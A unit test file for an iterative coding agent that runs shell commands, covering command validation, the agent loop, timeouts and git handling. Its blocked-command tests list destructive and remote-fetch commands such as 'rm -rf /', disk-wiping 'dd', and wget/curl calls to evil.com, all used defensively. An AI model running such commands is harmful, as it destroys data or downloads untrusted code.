# SPDX-FileCopyrightText: Copyright (c) 2026, NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Unit tests for the iterative predictor."""

import asyncio
import subprocess
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from nat_swe_bench.predictors.predict_iterative.predict_iterative import (
    DANGEROUS_PATTERNS,
    ExecutionTimeoutError,
    FormatError,
    IterativeAgent,
    IterativeAgentConfig,
    LimitsExceeded,
    Submitted,
    validate_command,
)


# =============================================================================
# Fixtures
# =============================================================================

@pytest.fixture
def mock_llm():
    """Create a mock LLM that returns configurable responses."""
    llm = AsyncMock()
    return llm


@pytest.fixture
def agent_config():
    """Create a default agent configuration for testing."""
    return IterativeAgentConfig(
        step_limit=10,
        timeout=5,
        max_output_length=1000
    )


@pytest.fixture
def temp_repo_path(tmp_path):
    """Create a temporary directory to simulate a repository."""
    repo_path = tmp_path / "test_repo"
    repo_path.mkdir()
    return repo_path


@pytest.fixture
def agent(mock_llm, temp_repo_path, agent_config):
    """Create an IterativeAgent instance with mocked dependencies."""
    return IterativeAgent(mock_llm, temp_repo_path, agent_config)


def create_llm_response(content: str, input_tokens: int = 100, output_tokens: int = 50):
    """Helper to create a mock LLM response with token usage."""
    response = MagicMock()
    response.content = content
    response.response_metadata = {
        'token_usage': {
            'prompt_tokens': input_tokens,
            'completion_tokens': output_tokens
        }
    }
    return response


# =============================================================================
# test_command_validation - Security validation tests
# =============================================================================

class TestCommandValidation:
    """Tests for the command validation security checks."""

    @pytest.mark.parametrize("command", [
        "ls -la",
        "cat file.txt",
        "grep -r 'pattern' .",
        "python script.py",
        "make test",
        "npm install",
        "git status",
        "echo 'hello' > output.txt",
        "rm -rf ./temp_dir",  # Relative path is ok
        "rm file.txt",
    ])
    def test_safe_commands_allowed(self, command):
        """Test that safe commands pass validation."""
        is_valid, error_msg = validate_command(command)
        assert is_valid, f"Command '{command}' should be allowed but got: {error_msg}"

    @pytest.mark.parametrize("command,expected_error", [
        ("rm -rf /", "root or home"),
        ("rm -rf ~", "root or home"),
        ("rm -rf / ", "root or home"),  # With trailing space
        ("rm -rf ..", "parent directory"),
        ("rm -rf *", "Wildcard"),
        ("sudo apt-get install", "sudo"),
        ("echo test > /dev/sda", "device files"),
        ("mkfs.ext4 /dev/sda1", "Formatting"),
        ("fdisk /dev/sda", "partitioning"),
        ("dd if=/dev/zero of=/dev/sda", "dd"),
        ("wget http://evil.com/script.sh", "wget"),
        ("curl https://evil.com/malware", "curl"),
        ("chmod 777 /etc/passwd", "777"),
        ("chown root file.txt", "root"),
    ])
    def test_dangerous_commands_blocked(self, command, expected_error):
        """Test that dangerous commands are blocked with appropriate error messages."""
        is_valid, error_msg = validate_command(command)
        assert not is_valid, f"Command '{command}' should be blocked"
        assert expected_error.lower() in error_msg.lower(), \
            f"Error message should contain '{expected_error}', got: {error_msg}"


# =============================================================================
# test_iterative_agent_basic_flow - End-to-end execution
# =============================================================================

class TestIterativeAgentBasicFlow:
    """Tests for the basic agent execution flow."""

    @pytest.mark.asyncio
    async def test_basic_flow_to_submission(self, agent, mock_llm):
        """Test that agent completes a basic flow and submits correctly."""
        # Setup: LLM returns a sequence of responses ending with submission
        responses = [
            create_llm_response("THOUGHT: Let me check the files.\n\n```bash\nls -la\n```"),
            create_llm_response("THOUGHT: Now I'll submit.\n\n```bash\necho COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT && git add -A && git diff --cached\n```"),
        ]
        mock_llm.ainvoke = AsyncMock(side_effect=responses)

        # Mock subprocess to return success
        with patch('nat_swe_bench.predictors.predict_iterative.predict_iterative.asyncio.to_thread') as mock_thread:
            # First command: ls -la
            ls_result = MagicMock()
            ls_result.returncode = 0
            ls_result.stdout = "file1.py\nfile2.py\n"

            # Second command: submission
            submit_result = MagicMock()
            submit_result.returncode = 0
            submit_result.stdout = "COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT\ndiff --git a/file.py b/file.py\n+fixed line"

            mock_thread.side_effect = [ls_result, submit_result]

            exit_status, result = await agent.run("Fix the bug in file.py")

        assert exit_status == "Submitted"
        assert "diff" in result or "COMPLETE_TASK" in result
        assert agent.n_steps == 2

    @pytest.mark.asyncio
    async def test_token_accumulation(self, agent, mock_llm):
        """Test that tokens are correctly accumulated across steps."""
        responses = [
            create_llm_response("THOUGHT: Step 1\n\n```bash\nls\n```", input_tokens=100, output_tokens=50),
            create_llm_response("THOUGHT: Submit\n\n```bash\necho COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT && git add -A && git diff --cached\n```", input_tokens=200, output_tokens=100),
        ]
        mock_llm.ainvoke = AsyncMock(side_effect=responses)

        with patch('nat_swe_bench.predictors.predict_iterative.predict_iterative.asyncio.to_thread') as mock_thread:
            result1 = MagicMock(returncode=0, stdout="output")
            result2 = MagicMock(returncode=0, stdout="COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT\npatch")
            mock_thread.side_effect = [result1, result2]

            await agent.run("Test task")

        assert agent.total_input_tokens == 300  # 100 + 200
        assert agent.total_output_tokens == 150  # 50 + 100

    @pytest.mark.asyncio
    async def test_step_limit_exceeded(self, mock_llm, temp_repo_path):
        """Test that agent stops when step limit is reached."""
        config = IterativeAgentConfig(step_limit=2, timeout=5)
        agent = IterativeAgent(mock_llm, temp_repo_path, config)

        # LLM always returns a valid command but never submits
        mock_llm.ainvoke = AsyncMock(
            return_value=create_llm_response("THOUGHT: Working\n\n```bash\nls\n```")
        )

        with patch('nat_swe_bench.predictors.predict_iterative.predict_iterative.asyncio.to_thread') as mock_thread:
            mock_thread.return_value = MagicMock(returncode=0, stdout="output")

            exit_status, result = await agent.run("Task")

        assert exit_status == "LimitsExceeded"
        assert "step limit" in result.lower()


# =============================================================================
# test_format_error_recovery - LLM output validation
# =============================================================================

class TestFormatErrorRecovery:
    """Tests for handling malformed LLM responses."""

    @pytest.mark.asyncio
    async def test_recovery_from_no_bash_block(self, agent, mock_llm):
        """Test that agent recovers when LLM doesn't include a bash block."""
        responses = [
            # First response: no bash block
            create_llm_response("THOUGHT: I'm thinking about this problem..."),
            # Second response: proper bash block
            create_llm_response("THOUGHT: Now I'll run a command.\n\n```bash\necho COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT && git add -A && git diff --cached\n```"),
        ]
        mock_llm.ainvoke = AsyncMock(side_effect=responses)

        with patch('nat_swe_bench.predictors.predict_iterative.predict_iterative.asyncio.to_thread') as mock_thread:
            mock_thread.return_value = MagicMock(returncode=0, stdout="COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT\npatch")

            exit_status, _ = await agent.run("Task")

        assert exit_status == "Submitted"
        assert agent.n_steps == 2  # First step failed format, second succeeded

    @pytest.mark.asyncio
    async def test_recovery_from_multiple_bash_blocks(self, agent, mock_llm):
        """Test that agent recovers when LLM includes multiple bash blocks."""
        responses = [
            # First response: multiple bash blocks
            create_llm_response("```bash\nls\n```\n\n```bash\ncat file.txt\n```"),
            # Second response: single bash block
            create_llm_response("THOUGHT: Submit\n\n```bash\necho COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT && git add -A && git diff --cached\n```"),
        ]
        mock_llm.ainvoke = AsyncMock(side_effect=responses)

        with patch('nat_swe_bench.predictors.predict_iterative.predict_iterative.asyncio.to_thread') as mock_thread:
            mock_thread.return_value = MagicMock(returncode=0, stdout="COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT\npatch")

            exit_status, _ = await agent.run("Task")

        assert exit_status == "Submitted"

    @pytest.mark.asyncio
    async def test_recovery_from_dangerous_command(self, agent, mock_llm):
        """Test that agent recovers when LLM suggests a dangerous command."""
        responses = [
            # First response: dangerous command
            create_llm_response("THOUGHT: Delete everything\n\n```bash\nrm -rf /\n```"),
            # Second response: safe command
            create_llm_response("THOUGHT: Submit\n\n```bash\necho COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT && git add -A && git diff --cached\n```"),
        ]
        mock_llm.ainvoke = AsyncMock(side_effect=responses)

        with patch('nat_swe_bench.predictors.predict_iterative.predict_iterative.asyncio.to_thread') as mock_thread:
            mock_thread.return_value = MagicMock(returncode=0, stdout="COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT\npatch")

            exit_status, _ = await agent.run("Task")

        assert exit_status == "Submitted"


# =============================================================================
# test_timeout_handling - Command timeout scenarios
# =============================================================================

class TestTimeoutHandling:
    """Tests for command execution timeout handling."""

    @pytest.mark.asyncio
    async def test_command_timeout_recovery(self, agent, mock_llm):
        """Test that agent recovers from a command timeout."""
        responses = [
            create_llm_response("THOUGHT: Run slow command\n\n```bash\nsleep 100\n```"),
            create_llm_response("THOUGHT: Submit\n\n```bash\necho COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT && git add -A && git diff --cached\n```"),
        ]
        mock_llm.ainvoke = AsyncMock(side_effect=responses)

        with patch('nat_swe_bench.predictors.predict_iterative.predict_iterative.asyncio.to_thread') as mock_thread:
            # First call: timeout
            mock_thread.side_effect = [
                subprocess.TimeoutExpired(cmd="sleep 100", timeout=5),
                MagicMock(returncode=0, stdout="COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT\npatch"),
            ]

            exit_status, _ = await agent.run("Task")

        assert exit_status == "Submitted"

    @pytest.mark.asyncio
    async def test_timeout_message_includes_command(self, agent, mock_llm):
        """Test that timeout error message includes the timed-out command."""
        mock_llm.ainvoke = AsyncMock(
            return_value=create_llm_response("THOUGHT: Slow\n\n```bash\nsleep 999\n```")
        )

        with patch('nat_swe_bench.predictors.predict_iterative.predict_iterative.asyncio.to_thread') as mock_thread:
            mock_thread.side_effect = subprocess.TimeoutExpired(cmd="sleep 999", timeout=5)

            # Run one step - it will timeout and add error message
            agent.add_message("system", "test")
            agent.add_message("user", "test")
            agent.n_steps = 1

            response = await agent._query_llm()

            with pytest.raises(ExecutionTimeoutError) as exc_info:
                await agent._execute_action(response)

            assert "sleep 999" in str(exc_info.value)


# =============================================================================
# test_workspace_isolation - Concurrent instance isolation
# =============================================================================

class TestWorkspaceIsolation:
    """Tests for workspace isolation between instances."""

    def test_different_instance_ids_get_different_paths(self):
        """Test that different instance_ids produce different workspace paths."""
        from nat_swe_bench.predictors.predict_iterative.tools.git_tool import get_repo_path

        workspace = "/tmp/workspace"
        repo_url = "https://github.com/org/repo"

        path1 = get_repo_path(workspace, repo_url, instance_id="instance-001")
        path2 = get_repo_path(workspace, repo_url, instance_id="instance-002")

        assert path1 != path2
        assert "instance-001" in str(path1)
        assert "instance-002" in str(path2)

    def test_same_instance_id_gets_same_path(self):
        """Test that the same instance_id always produces the same path."""
        from nat_swe_bench.predictors.predict_iterative.tools.git_tool import get_repo_path

        workspace = "/tmp/workspace"
        repo_url = "https://github.com/org/repo"
        instance_id = "instance-001"

        path1 = get_repo_path(workspace, repo_url, instance_id=instance_id)
        path2 = get_repo_path(workspace, repo_url, instance_id=instance_id)

        assert path1 == path2

    def test_no_instance_id_uses_default_path(self):
        """Test that no instance_id uses the default org/repo path."""
        from nat_swe_bench.predictors.predict_iterative.tools.git_tool import get_repo_path

        workspace = "/tmp/workspace"
        repo_url = "https://github.com/myorg/myrepo"

        path = get_repo_path(workspace, repo_url, instance_id=None)

        assert str(path) == "/tmp/workspace/myorg/myrepo"

    def test_ssh_url_parsing(self):
        """Test that SSH URLs are correctly parsed."""
        from nat_swe_bench.predictors.predict_iterative.tools.git_tool import get_repo_path

        workspace = "/tmp/workspace"
        repo_url = "git@github.com:org/repo.git"

        path = get_repo_path(workspace, repo_url, instance_id="test-123")

        assert "org" in str(path)
        assert "repo" in str(path)
        assert "test-123" in str(path)


# =============================================================================
# test_repo_setup_and_checkout - Git operations
# =============================================================================

class TestRepoSetupAndCheckout:
    """Tests for git repository setup and checkout operations."""

    @pytest.mark.asyncio
    async def test_clone_repository_success(self, tmp_path):
        """Test successful repository cloning."""
        from nat_swe_bench.predictors.predict_iterative.tools.git_tool import clone_repository

        target_path = tmp_path / "repo"
        repo_url = "https://github.com/test/repo"

        with patch('nat_swe_bench.predictors.predict_iterative.tools.git_tool.Repo') as MockRepo:
            mock_repo = MagicMock()
            MockRepo.clone_from.return_value = mock_repo

            with patch('nat_swe_bench.predictors.predict_iterative.tools.git_tool.asyncio.to_thread') as mock_thread:
                mock_thread.return_value = mock_repo

                result = await clone_repository(repo_url, target_path)

            assert result == mock_repo

    @pytest.mark.asyncio
    async def test_clone_repository_invalid_url(self, tmp_path):
        """Test that invalid URLs raise ValueError."""
        from nat_swe_bench.predictors.predict_iterative.tools.git_tool import clone_repository

        target_path = tmp_path / "repo"
        invalid_url = "not-a-valid-url"

        with pytest.raises(ValueError) as exc_info:
            await clone_repository(invalid_url, target_path)

        assert "Invalid repository URL" in str(exc_info.value)

    @pytest.mark.asyncio
    async def test_checkout_commit_success(self):
        """Test successful commit checkout."""
        from nat_swe_bench.predictors.predict_iterative.tools.git_tool import checkout_commit

        mock_repo = MagicMock()
        commit_hash = "abc123"

        with patch('nat_swe_bench.predictors.predict_iterative.tools.git_tool.asyncio.to_thread') as mock_thread:
            mock_thread.return_value = None

            await checkout_commit(mock_repo, commit_hash)

            # Verify checkout was called
            mock_thread.assert_called_once()

    @pytest.mark.asyncio
    async def test_clone_timeout(self, tmp_path):
        """Test that clone operation times out correctly."""
        from nat_swe_bench.predictors.predict_iterative.tools.git_tool import clone_repository

        target_path = tmp_path / "repo"
        repo_url = "https://github.com/test/repo"

        with patch('nat_swe_bench.predictors.predict_iterative.tools.git_tool.asyncio.wait_for') as mock_wait:
            mock_wait.side_effect = asyncio.TimeoutError()

            with pytest.raises(asyncio.TimeoutError):
                await clone_repository(repo_url, target_path, timeout=1)


# =============================================================================
# test_cleanup - Resource cleanup
# =============================================================================

class TestCleanup:
    """Tests for resource cleanup operations."""

    @pytest.mark.asyncio
    async def test_repo_manager_cleanup(self, tmp_path):
        """Test that RepoManager cleans up all active repos."""
        from nat_swe_bench.predictors.predict_iterative.tools.git_tool import RepoManager

        manager = RepoManager(str(tmp_path))

        # Create some fake repo directories
        repo1 = tmp_path / "org1" / "repo1"
        repo2 = tmp_path / "org2" / "repo2"
        repo1.mkdir(parents=True)
        repo2.mkdir(parents=True)

        # Add to active repos
        manager.active_repos[str(repo1)] = MagicMock(repo_path=repo1)
        manager.active_repos[str(repo2)] = MagicMock(repo_path=repo2)

        await manager.cleanup()

        assert not repo1.exists()
        assert not repo2.exists()
        assert len(manager.active_repos) == 0

    @pytest.mark.asyncio
    async def test_cleanup_handles_missing_directory(self, tmp_path):
        """Test that cleanup handles already-deleted directories gracefully."""
        from nat_swe_bench.predictors.predict_iterative.tools.git_tool import RepoManager

        manager = RepoManager(str(tmp_path))

        # Add a non-existent path to active repos
        fake_path = tmp_path / "nonexistent"
        manager.active_repos[str(fake_path)] = MagicMock(repo_path=fake_path)

        # Should not raise
        await manager.cleanup()

        assert len(manager.active_repos) == 0

    @pytest.mark.asyncio
    async def test_register_cleanup_error_handling(self):
        """Test that register.py cleanup handles errors gracefully."""
        from unittest.mock import AsyncMock
        from nat_swe_bench.predictors.predict_iterative.tools.git_tool import RepoManager

        # Create a mock that raises an exception
        manager = RepoManager("/tmp/test")
        manager.cleanup = AsyncMock(side_effect=Exception("Cleanup failed"))

        # The cleanup should not propagate the exception in the finally block
        # This tests the error handling in register.py
        try:
            await manager.cleanup()
        except Exception:
            pass  # Expected - the test is that this doesn't crash the system


# =============================================================================
# Integration test with mocked LLM
# =============================================================================

# =============================================================================
# Additional coverage tests
# =============================================================================

class TestAdditionalCoverage:
    """Additional tests to improve coverage."""

    def test_build_task_description_with_hints(self):
        """Test task description building with hints."""
        from nat_swe_bench.predictors.predict_iterative.predict_iterative import SweBenchPredictor

        # Create a mock SWEBenchInput
        mock_input = MagicMock()
        mock_input.problem_statement = "Fix the bug"
        mock_input.hints_text = "Check the utils module"

        # Create a minimal predictor to test the method
        predictor = object.__new__(SweBenchPredictor)
        result = predictor._build_task_description(mock_input)

        assert "Fix the bug" in result
        assert "Additional Context" in result
        assert "Check the utils module" in result

    def test_build_task_description_without_hints(self):
        """Test task description building without hints."""
        from nat_swe_bench.predictors.predict_iterative.predict_iterative import SweBenchPredictor

        mock_input = MagicMock()
        mock_input.problem_statement = "Fix the bug"
        mock_input.hints_text = None

        predictor = object.__new__(SweBenchPredictor)
        result = predictor._build_task_description(mock_input)

        assert "Fix the bug" in result
        assert "Additional Context" not in result

    @pytest.mark.asyncio
    async def test_repo_manager_setup_existing_repo(self, tmp_path):
        """Test setup_repository when repo is already active."""
        from nat_swe_bench.predictors.predict_iterative.tools.git_tool import RepoManager, RepoContext

        manager = RepoManager(str(tmp_path))

        # Create a mock context already in active_repos
        repo_path = tmp_path / "instance-1" / "org" / "repo"
        repo_path.mkdir(parents=True)

        mock_context = RepoContext(
            repo_url="https://github.com/org/repo",
            repo_path=repo_path,
            repo=MagicMock()
        )
        manager.active_repos[str(repo_path)] = mock_context

        with patch('nat_swe_bench.predictors.predict_iterative.tools.git_tool.checkout_commit') as mock_checkout:
            mock_checkout.return_value = None

            result = await manager.setup_repository(
                "https://github.com/org/repo",
                "abc123",
                "instance-1"
            )

        assert result == mock_context
        mock_checkout.assert_called_once()

    @pytest.mark.asyncio
    async def test_clone_cleans_existing_path(self, tmp_path):
        """Test that clone removes existing directory before cloning."""
        from nat_swe_bench.predictors.predict_iterative.tools.git_tool import clone_repository

        target_path = tmp_path / "repo"
        target_path.mkdir()
        (target_path / "existing_file.txt").write_text("old content")

        with patch('nat_swe_bench.predictors.predict_iterative.tools.git_tool.Repo') as MockRepo:
            mock_repo = MagicMock()

            with patch('nat_swe_bench.predictors.predict_iterative.tools.git_tool.asyncio.wait_for') as mock_wait:
                mock_wait.return_value = mock_repo

                result = await clone_repository("https://github.com/org/repo", target_path)

        # The old directory should have been removed (in reality, then clone creates new)
        assert result == mock_repo

    @pytest.mark.asyncio
    async def test_checkout_timeout(self):
        """Test checkout operation timeout."""
        from nat_swe_bench.predictors.predict_iterative.tools.git_tool import checkout_commit

        mock_repo = MagicMock()

        with patch('nat_swe_bench.predictors.predict_iterative.tools.git_tool.asyncio.wait_for') as mock_wait:
            mock_wait.side_effect = asyncio.TimeoutError()

            with pytest.raises(asyncio.TimeoutError):
                await checkout_commit(mock_repo, "abc123", timeout=1)

    def test_output_truncation(self, agent):
        """Test that long outputs are properly truncated."""
        # Generate output longer than max_output_length
        long_output = "x" * 2000  # Config has max_output_length=1000

        # Simulate truncation logic
        max_length = agent.config.max_output_length
        if len(long_output) > max_length:
            elided_chars = len(long_output) - max_length
            head_tail_length = max_length // 2
            truncated = (
                f"{long_output[:head_tail_length]}\n"
                f"<elided_chars>\n{elided_chars} characters elided\n</elided_chars>\n"
                f"{long_output[-head_tail_length:]}"
            )

        assert "elided_chars" in truncated
        assert "1000 characters elided" in truncated

    @pytest.mark.asyncio
    async def test_add_message_invalid_role(self, agent):
        """Test that invalid role raises ValueError."""
        with pytest.raises(ValueError) as exc_info:
            agent.add_message("invalid_role", "content")

        assert "Unknown role" in str(exc_info.value)


class TestIntegrationMockedLLM:
    """Integration tests with mocked LLM."""

    @pytest.mark.asyncio
    async def test_full_workflow_simulation(self, tmp_path):
        """Simulate a complete workflow with realistic LLM responses."""
        # Create a mock LLM
        mock_llm = AsyncMock()

        # Simulate a realistic interaction: explore, edit, test, submit
        responses = [
            # Step 1: Explore
            create_llm_response(
                "THOUGHT: First, let me understand the project structure.\n\n```bash\nls -la\n```"
            ),
            # Step 2: Read file
            create_llm_response(
                "THOUGHT: Let me look at the main file.\n\n```bash\ncat main.py\n```"
            ),
            # Step 3: Make edit
            create_llm_response(
                "THOUGHT: I found the bug. Let me fix it.\n\n```bash\nsed -i 's/old/new/g' main.py\n```"
            ),
            # Step 4: Submit
            create_llm_response(
                "THOUGHT: The fix is complete. Submitting.\n\n```bash\necho COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT && git add -A && git diff --cached\n```"
            ),
        ]
        mock_llm.ainvoke = AsyncMock(side_effect=responses)

        # Create test files
        repo_path = tmp_path / "repo"
        repo_path.mkdir()
        (repo_path / "main.py").write_text("old code here")

        config = IterativeAgentConfig(step_limit=10, timeout=5)
        agent = IterativeAgent(mock_llm, repo_path, config)

        with patch('nat_swe_bench.predictors.predict_iterative.predict_iterative.asyncio.to_thread') as mock_thread:
            # Return realistic outputs for each command
            mock_thread.side_effect = [
                MagicMock(returncode=0, stdout="main.py\nREADME.md\n"),
                MagicMock(returncode=0, stdout="old code here\n"),
                MagicMock(returncode=0, stdout=""),
                MagicMock(returncode=0, stdout="COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT\ndiff --git a/main.py\n-old\n+new"),
            ]

            exit_status, patch_result = await agent.run("Fix the bug in main.py")

        assert exit_status == "Submitted"
        assert agent.n_steps == 4
        assert agent.total_input_tokens > 0
        assert agent.total_output_tokens > 0
